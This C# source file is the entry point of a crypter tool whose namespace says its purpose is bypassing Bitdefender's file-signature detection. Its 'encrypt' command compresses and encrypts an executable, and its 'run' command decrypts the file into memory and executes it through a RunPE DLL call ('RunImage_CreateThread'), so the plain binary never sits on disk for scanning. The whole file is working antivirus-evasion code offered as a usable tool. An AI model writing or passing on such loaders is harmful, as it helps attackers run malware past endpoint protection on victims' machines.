using System.Runtime.InteropServices;
using System.Runtime.CompilerServices;

[assembly: InternalsVisibleTo("DotNetTests")]

namespace BitdefenderFileSignatureDetectionBypass;

public class Program
{
    [DllImport("RunPE64.dll", CharSet = CharSet.Unicode, CallingConvention = CallingConvention.StdCall)]
    public static extern int RunImage_CreateThread(byte[] file, [MarshalAs(UnmanagedType.LPWStr)] string commandLine);

    static void Main(string[] args)
    {
        try
        {
            ProcessArguments(args);
        }
        catch (ArgumentException)
        {
            PrintHelp();
            Environment.Exit(1);
        }
        catch (Exception ex)
        {
            Console.WriteLine($"Error: {ex.Message}");
            Environment.Exit(1);
        }
    }

    internal static void ProcessArguments(string[] args)
    {
        if(args is null)
        {
            throw new NullReferenceException(nameof(args));
        }

        if (args.Length < 1)
        {
            throw new ArgumentException(nameof(args));
        }

        string command = args[0].ToLower();
        if (command == "encrypt")
        {
            if (args.Length != 7 || args[1] != "-i" || args[3] != "-o" || args[5] != "-k")
            {
                throw new ArgumentException(nameof(args));
            }

            string inputFilePath = args[2];
            string outputFilePath = args[4];
            string outputKeyFilePath = args[6];

            if (CompressionEncryption.CompressAndEncrypt(inputFilePath, outputFilePath, outputKeyFilePath))
            {
                Console.WriteLine("Encrypted '" + inputFilePath + "'");
                Console.WriteLine("Saved encrypted file to '" + outputFilePath + "'");
                Console.WriteLine("Saved key to '" + outputKeyFilePath + "'");
            }
        }
        else if (command == "run")
        {
            if ((args.Length != 5 && args.Length != 7) || args[1] != "-c" || args[3] != "-k" || (args.Length == 7 && args[5] != "-args"))
            {
                throw new ArgumentException(nameof(args));
            }

            string encryptedFilePath = args[2];
            string keyFilePath = args[4];
            string argumentList = args.Length == 7 ? args[6] : "";

            byte[] decryptedBytes = CompressionEncryption.DecompressAndDecrypt_ToMemory(encryptedFilePath, keyFilePath);

            if (decryptedBytes is null)
            {
                Console.WriteLine("Decrypting '" + encryptedFilePath + "' failed");
                Console.WriteLine("With key file at '" + keyFilePath + "' failed");
                return;
            }

            if (RunImage_CreateThread(decryptedBytes, argumentList) != 0)
            {
                Console.WriteLine("Encountered an error");
            }
        }
        else
        {
            throw new ArgumentException(nameof(args));
        }
    }

    static void PrintHelp()
    {
        Console.WriteLine("Usage:");
        Console.WriteLine("  encrypt -i INPUT_FILE_PATH -o OUTPUT_FILE_PATH -k OUTPUT_KEY_FILE_PATH");
        Console.WriteLine("  run -c INPUT_ENCRYPTED_FILE -k KEY_FILE_PATH -args \"ARGUMENT_LIST\"");
        Console.WriteLine("  Paths containing whitespace characters need to be wrapped in \"\"");
    }
}